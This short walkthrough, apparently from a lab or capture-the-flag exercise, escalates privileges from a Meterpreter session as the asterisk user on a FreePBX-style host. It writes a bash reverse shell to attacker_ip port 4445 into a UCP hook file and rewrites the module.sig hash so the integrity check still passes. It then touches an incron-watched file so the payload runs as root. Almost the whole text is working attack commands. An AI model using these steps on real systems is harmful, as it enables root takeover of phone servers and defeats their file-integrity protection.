Prerequisites:

You have a Meterpreter session as asterisk.
You have a Netcat listener running on port 4445. 
Step 1: Switch to a System Shell because You cannot run Linux commands like cat, sha256sum, or touch directly in the Meterpreter prompt. 
You must enter a shell first. 


meterpreter > shell

Step 2: Write the Payload
Create the malicious hook file with your reverse shell payload. 

command:
cat > /var/www/html/admin/modules/ucp/hooks/logrotate << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/attacker_ip/4445 0>&1
EOF

Step 3: Update the Signature Hash
The system checks the file integrity. You must update module.sig with the hash of the file you just created. 

command:
NEW_HASH=$(sha256sum /var/www/html/admin/modules/ucp/hooks/logrotate | awk '{print $1}')
sed -i "s|hooks/logrotate = .*|hooks/logrotate = $NEW_HASH|" /var/www/html/admin/modules/ucp/module.sig

Step 4: Trigger the Exploit
Touch the monitored file to trigger the incron watcher, which executes your payload as root. 

command:
touch /var/spool/asterisk/incron/ucp.logrotate

